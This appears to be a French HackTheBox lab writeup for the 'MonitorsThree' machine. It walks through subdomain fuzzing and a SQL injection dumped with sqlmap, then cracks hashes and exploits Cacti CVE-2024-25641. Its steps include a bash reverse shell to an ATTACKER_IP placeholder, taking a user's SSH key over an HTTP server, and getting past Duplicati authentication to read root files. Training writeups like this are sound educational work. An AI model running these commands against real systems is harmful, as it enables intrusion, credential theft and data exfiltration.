🌐 [English](README.md) | [Français](README.fr.md) | [日本語](README.ja.md)

# MonitorsThree : HackTheBox Writeup

<div style="display: flex; align-items: center; gap: 20px;">
<img src="https://htb-mp-prod-public-storage.s3.eu-central-1.amazonaws.com/avatars/a9c8709743c935ae079e3b04d9304c99.png" width="120"/>
<div>

**Difficulté**: Medium  
**OS**: Linux  
**Type**: Web / SQLi / CVE  

</div>
</div>

---

## Résumé de la chaîne d'exploitation

```
Nmap → dirsearch → ffuf → cacti.monitorsthree.htb
→ SQLi (mot de passe oublié) → sqlmap → crack du hash (hashcat)
→ CVE-2024-25641 RCE → reverse shell (www-data)
→ su marcus → SSH (id_rsa) → user flag
→ linpeas → Duplicati (localhost) → tunnel SSH
→ Bypass auth Duplicati → backup root.txt → root flag
```

---

## Énumération

### Scan Nmap

```bash
nmap -sC -sV <TARGET_IP> -oN scan.txt -Pn
```

![nmap scan](assets/scan.png)

Ports ouverts : SSH (22), HTTP (80), et quelques services secondaires (5555, 8084).  
Machine : `monitorsthree.htb`, Linux.

> SSH est noté pour plus tard. Les ports 5555 et 8084 n'offrent pas de piste d'exploitation évidente.

### Configuration DNS

Le port 80 nécessite d'ajouter le hostname dans `/etc/hosts` :

```bash
sudo nano /etc/hosts
```

![dns add](assets/DNS.png)

### Énumération des répertoires

```bash
dirsearch -u http://monitorsthree.htb/
```

![dirsearch](assets/dirsearch.png)

On trouve des fichiers JS/polices/images et une page `/admin`, inaccessible pour l'instant.

### Énumération des sous-domaines

```bash
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-110000.txt \
  -u http://monitorsthree.htb/ -H "Host: FUZZ.monitorsthree.htb" -fs 13560
# -fs 13560 filtre les faux positifs
```

![ffuf](assets/ffuf.png)

On découvre `cacti.monitorsthree.htb`, un outil de monitoring système. Après l'avoir ajouté à `/etc/hosts`, on arrive sur un panneau de login qui révèle la version du logiciel.

![cacti](assets/cacti.png)

---

## Foothold : SQLi + CVE-2024-25641 RCE

### Injection SQL sur la page "Mot de passe oublié"

La page "Mot de passe oublié" est vulnérable à une injection SQL.

![forgot](assets/forgot.png)

On capture la requête avec Burp Suite :

![request](assets/request.png)

### Extraction de la base de données avec SQLMap

```bash
sqlmap -r request.txt --dbs --batch
```

![sqlmap](assets/sqlmap.png)

```bash
sqlmap -r request.txt --dbms=mysql --technique=B \
  -D monitorsthree_db --dump-all --random-agent --level 5
```

On récupère plusieurs mots de passe hashés et des credentials `admin`.

### Crack du hash

```bash
hashcat -m 0 -a 0 "<MD5_HASH>" /usr/share/wordlists/rockyou.txt --show
```

Un des quatre hashes se crack → mot de passe récupéré.

### Connexion à Cacti

Credentials : `admin` / `<mot de passe cracké>`

![panel](assets/panel.png)

### RCE via CVE-2024-25641

Cette version de Cacti est vulnérable à une RCE authentifiée. On utilise le PoC de [@StopThatTalace](https://github.com/StopThatTalace/CVE-2024-25641-CACTI-RCE-1.2.26).

**Listener :**

```bash
nc -lnvp 4242
```

**Exploit :**

```bash
python3 CVE-2024-25641.py http://cacti.monitorsthree.htb/cacti/ \
  --user admin --pass <ADMIN_PASSWORD> \
  -x "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4242 0>&1'"
```

![reverse](assets/reverse.png)

On obtient un shell en tant que `www-data`.

---

## User Flag

### Pivot vers marcus

```bash
ls /home
```

![home](assets/home.png)

Se connecter en SSH à marcus nécessite une clé :

![bone](assets/bone.png)

On passe sous marcus avec le mot de passe récupéré depuis la base de données, puis on sert sa clé SSH :

```bash
# Sur la cible, en tant que marcus :
cd /home/marcus/.ssh
python3 -m http.server
```

```bash
# Sur Kali :
wget http://<TARGET_IP>:8000/id_rsa
```

![wget](assets/wget.png)

```bash
chmod 600 id_rsa
ssh -i id_rsa marcus@<TARGET_IP>
```

![ssh](assets/ssh.png)

User flag obtenu.

---

## Élévation de privilèges : Bypass auth Duplicati

### Découverte du port interne

```bash
# linpeas
```

![linpeas](assets/linpeas.png)

On repère une application web sur un port interne. On monte un tunnel SSH pour y accéder :

![tunel](assets/tunel.png)

Une instance `Duplicati` tourne en local :

![duplicati](assets/duplicati.png)

### Bypass de l'authentification Duplicati

On suit [cet article](https://medium.com/@STarXT/duplicati-bypassing-login-authentication-with-server-passphrase-024d6991e9ee) pour contourner le login :

1. **Extraire le mot de passe de la base de données** de la config locale de Duplicati (accessible en tant que marcus).
2. **Intercepter le nonce** via Burp Suite pendant le flux de login.
3. **Générer un mot de passe valide** à partir du nonce + de la passphrase de la base.

![password](assets/password.png)
![nonce](assets/nonce.png)
![pass](assets/pass.png)

On remplace le champ mot de passe dans la requête interceptée par notre valeur générée → authentifié.

![app](assets/app.png)

Duplicati tourne en tant que root, ce qui nous donne accès en lecture à n'importe quel fichier du système.

### Lecture de root.txt via Backup/Restore

**Destination :** `/source/home/marcus`

![source](assets/marcus_source.png)

**Source :** `/root/root.txt`

![source](assets/source.png)

**Lancer le backup :**

![backup](assets/backup.png)

**Restaurer :**

![restore](assets/restore.png)

**Résultat :**

![root](assets/root.png)

Root flag obtenu.

---

## Outils utilisés

- `nmap` : scan de ports
- `dirsearch` : énumération de répertoires
- `ffuf` : fuzzing de sous-domaines
- `sqlmap` : exploitation de l'injection SQL
- `hashcat` : crack de hash
- `burp suite` : interception de requêtes
- PoC `CVE-2024-25641` : RCE Cacti
- `netcat` : listener reverse shell
- `ssh` / `wget` : exfiltration de la clé
- `linpeas` : énumération pour l'escalade de privilèges
- `duplicati` : backup/restore en tant que root
